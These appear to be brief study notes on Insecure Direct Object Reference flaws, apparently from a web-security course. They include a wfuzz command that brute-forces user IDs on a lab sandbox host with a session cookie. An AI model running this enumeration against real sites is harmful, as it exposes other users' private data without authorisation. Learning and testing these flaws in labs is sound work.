# IDOR Insecure Direct Object Referencing

**_Static File_ IDOR** - Being able to increment or decrement IDs  is a tell-tale sign of Insecure Direct Object Referencing. 
We're interested in any values in the URL segments that can be referenced, iterated, or brute-forced to exfiltrate information.

_Insecure Database Object Referencing_ or _"ID-Based" IDOR_  - iterate database entity id

brute force user ids
```bash
wfuzz -c -z file,/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt --hc 404 --hh 2873 -H "Cookie: PHPSESSID=ce1668e19863bc2784c76d8737a7e73c" http://idor-sandbox:80/user/?uid=FUZZ
```

## References
1. web200.Insecure Direct Object Referencing
2.   (OWASP, 2021), [https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html#introduction](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html#introduction) [↩︎](https://portal.offsec.com/courses/web-200/books-and-videos/modal/modules/insecure-direct-object-referencing/insecure-direct-object-referencing#fnref1)
3. (Portswigger, 2021), https://portswigger.net/web-security/access-control/idor ↩︎
